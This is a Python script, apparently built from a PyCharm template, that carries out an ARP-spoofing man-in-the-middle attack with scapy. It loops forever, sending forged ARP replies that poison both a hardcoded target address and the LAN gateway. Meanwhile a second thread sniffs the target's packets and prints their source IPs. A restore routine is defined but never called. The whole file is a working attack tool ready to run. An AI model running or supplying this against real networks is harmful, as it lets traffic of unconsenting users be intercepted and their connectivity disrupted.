# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import threading
import scapy.all as scapy
import time

from scapy.config import conf


def get_gateway_ip():
    """
    Return the gateway ip of the LAN

    """
    return conf.route.route("0.0.0.0")[2]


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff') / scapy.ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing

    scapy.send(arp_response, verbose=0)

    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = scapy.ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    scapy.send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


def arp_poisining(targe_ip, host_ip):
    while True:
        spoof(targe_ip, host_ip)
        spoof(host_ip, targe_ip)
        time.sleep(1)


def analyze_packet(packet):
    #packet.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}"
    print(packet['IP'].src)
    time.sleep(1)


def redirect_and_drop(target_ip, host_ip):
    scapy.sniff(filter=f"host {target_ip}", prn=analyze_packet, store=0)

if __name__ == '__main__':

    target_ip = "192.168.1.99"
    gateway_ip = get_gateway_ip()
    print(get_mac(target_ip))
    print(get_mac(gateway_ip))

    sniffed_packets_dropping_thread = threading.Thread(target=redirect_and_drop, args=(target_ip, gateway_ip))
    sniffed_packets_dropping_thread.start()
    arp_poisining(target_ip,gateway_ip)


    #See PyCharm help at https://www.jetbrains.com/help/pycharm/
